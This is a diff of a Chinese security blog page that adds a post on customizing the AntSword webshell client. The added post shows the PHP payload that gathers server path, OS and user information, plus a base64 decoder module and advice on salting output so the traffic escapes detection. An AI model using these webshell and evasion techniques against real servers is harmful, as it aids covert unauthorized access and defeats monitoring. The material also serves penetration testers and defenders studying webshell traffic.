</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"28e"</span> . <span class="string">"2484"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"4b3670"</span> . <span class="string">"9e8fe7"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $D = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($D == <span class="string">""</span>) $D = dirname($_SERVER[<span class="string">"PATH _TRANSLATED"</span>]);</span><br><span class="line">    $R = <span class="string">"&#123;$D&#125; "</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr($D, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (range(<span class="string">"C"</span>, <span class="string">"Z"</span>) <span class="keyword">as</span> $L) <span class="keyword">if</span> (is_dir(<span class="string">"&#123;$L&#125;:"</span>)) $R . = <span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $R.= <span class="string">"/"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $R.= <span class="string">" "</span>;</span><br><span class="line">    $u = (function_exists(<span class="string">"posix_getegid"</span>)) ? @posix_getpwuid(@posix_geteuid()) : <span class="string">""</span>;</span><br><span class="line">    $s = ($u) ? $u[<span class="string">"name"</span>] : @get_current_user();</span><br><span class="line">    $R.= php_uname();</span><br><span class="line">    $R.= <span class="string">" &#123;$s&#125;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $R;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR://"</span> . $e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面是base64解码器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2021/04/21 10:40:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  asoutput: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">''</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  decode_buff: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">'base64'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以在burp中抓包看看返回的数据</p>
+<p><img src="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7qp8jj5j30r80dct91.jpg" alt="image-20210421105844531"></p>
+<p>发现无法直接解码，可以看看我们之前发送的原始包，<code>asenc</code>函数就是指定的输出内容，默认情况下直接输出明文，若我们设置了解码器，那么我们在编码器内编写的混淆函数变会替换<code>asenc</code>的内容，然后服务器响应的数据通过<code>asenc</code>函数混淆后输出。在往后看，有一个<code>asoutput</code>函数，这个函数，它会在数据base之后的前后加入一些混淆数据。例如这个就在这个的最前面加入了<code>28e2484</code>，最后加入了<code>4b36709e8fe7</code>，相当于加盐操作了。不过rot13的话，因为本质是凯撒密码的变形，所以加盐也没什么用，不如用base。</p>
+<p>参考 ：<a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483895&amp;idx=1&amp;sn=1609e6c4df7ce585e2ed9a3e38f29051&amp;chksm=e91c5a0fde6bd319168b9e3d564b6fbbb26be208c1c8a26a9995baf0fc4d8e34df2c703fed81&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778179592&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483895&amp;idx=1&amp;sn=1609e6c4df7ce585e2ed9a3e38f29051&amp;chksm=e91c5a0fde6bd319168b9e3d564b6fbbb26be208c1c8a26a9995baf0fc4d8e34df2c703fed81&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778179592&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd</a></p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -179,16 +285,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/04/21/%E8%9A%81%E5%89%91%E6%94%B9%E9%80%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/17/Webshell-%E5%85%8D%E6%9D%80/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Webshell 免杀</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -203,607 +368,32 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/22/RCE/">RCE</a>
-    </h1>
-  
-
-        
-        <a href="/2021/02/22/RCE/" class="archive-article-date">
-  	<time datetime="2021-02-22T01:57:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="代码执行原理"><a href="#代码执行原理" class="headerlink" title="代码执行原理"></a>代码执行原理</h2><p>代码的执行来自于缺乏严格的过滤或者用户控制数据的逃逸。在这里由于攻击者可以控制部分或者所有内容传递给这些未进行严格过滤的函数，从而导致提交的内容会被作为PHP代码执行。如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。</p>
-        
-          <a class="article-more-a" href="/2021/02/22/RCE/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/22/RCE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UA头修改"><span class="toc-number">2.</span> <span class="toc-text">UA头修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量中的特征–编码器修改"><span class="toc-number">3.</span> <span class="toc-text">流量中的特征–编码器修改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修改🐎之全base加密"><span class="toc-number">3.1.</span> <span class="toc-text">修改🐎之全base加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改🐎之zlib-deflated-raw加密"><span class="toc-number">3.2.</span> <span class="toc-text">修改🐎之zlib_deflated_raw加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#流量中的0x修改"><span class="toc-number">3.3.</span> <span class="toc-text">流量中的0x修改</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解码器"><span class="toc-number">4.</span> <span class="toc-text">解码器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64解码"><span class="toc-number">4.1.</span> <span class="toc-text">base64解码</span></a></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
-  
-    <article id="post-OpenSSL漏洞复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/03/OpenSSL%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">OpenSSL漏洞复现</a>
-    </h1>
-  
-
-        
-        <a href="/2021/02/03/OpenSSL%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2021-02-02T21:11:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="CVE-2014-0160漏洞复现"><a href="#CVE-2014-0160漏洞复现" class="headerlink" title="CVE-2014-0160漏洞复现"></a><strong>CVE-2014-0160</strong>漏洞复现</h2><p>漏洞成因</p>
-        
-          <a class="article-more-a" href="/2021/02/03/OpenSSL%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/03/OpenSSL%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-基于端口的渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/30/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">基于端口的渗透测试</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/30/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="archive-article-date">
-  	<time datetime="2021-01-29T18:32:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="基于端口的渗透测试"><a href="#基于端口的渗透测试" class="headerlink" title="基于端口的渗透测试"></a>基于端口的渗透测试</h1><h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
-<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
-<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
-        
-          <a class="article-more-a" href="/2021/01/30/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/30/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-golang-爬虫" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/28/golang-%E7%88%AC%E8%99%AB/">golang 爬虫</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/28/golang-%E7%88%AC%E8%99%AB/" class="archive-article-date">
-  	<time datetime="2021-01-28T06:07:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>goalng的学习官方文档 <a href="https://tour.go-zh.org/welcome/1" target="_blank" rel="noopener">goalng中文教程</a></p>
-<h2 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h2><p>使用Golang原生http库</p>
-        
-          <a class="article-more-a" href="/2021/01/28/golang-%E7%88%AC%E8%99%AB/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/28/golang-%E7%88%AC%E8%99%AB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-浏览器解码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/23/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81/">浏览器解码</a>
-    </h1>
-  
-
-        
-        <a href="/2020/10/23/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2020-10-23T05:01:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="浏览器的解码规则"><a href="#浏览器的解码规则" class="headerlink" title="浏览器的解码规则"></a>浏览器的解码规则</h2><ul>
-<li><p>HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树</p></li></ul>
-        
-          <a class="article-more-a" href="/2020/10/23/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/23/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-HTTP与HTTPS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/19/HTTP%E4%B8%8EHTTPS/">HTTP与HTTPS</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/19/HTTP%E4%B8%8EHTTPS/" class="archive-article-date">
-  	<time datetime="2020-09-19T03:24:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="HTTP为什么不安全"><a href="#HTTP为什么不安全" class="headerlink" title="HTTP为什么不安全"></a>HTTP为什么不安全</h2>
-        
-          <a class="article-more-a" href="/2020/09/19/HTTP%E4%B8%8EHTTPS/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/19/HTTP%E4%B8%8EHTTPS/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/Redis/">Redis</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/Redis/" class="archive-article-date">
-  	<time datetime="2020-09-15T13:47:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>Redis本身是键值对数据库，但是值对应多种数据结构</strong></p>
-        
-          <a class="article-more-a" href="/2020/09/15/Redis/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/Redis/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-反序列化逃逸" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/">反序列化逃逸</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" class="archive-article-date">
-  	<time datetime="2020-09-05T01:42:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>什么情况下才会存在反序列话的逃逸？？？</p>
-<p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容的。</p>
-        
-          <a class="article-more-a" href="/2020/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/17/SSRF/">SSRF</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/17/SSRF/" class="archive-article-date">
-  	<time datetime="2020-08-17T04:36:34.967Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
-        
-          <a class="article-more-a" href="/2020/08/17/SSRF/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/17/SSRF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -826,8 +416,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
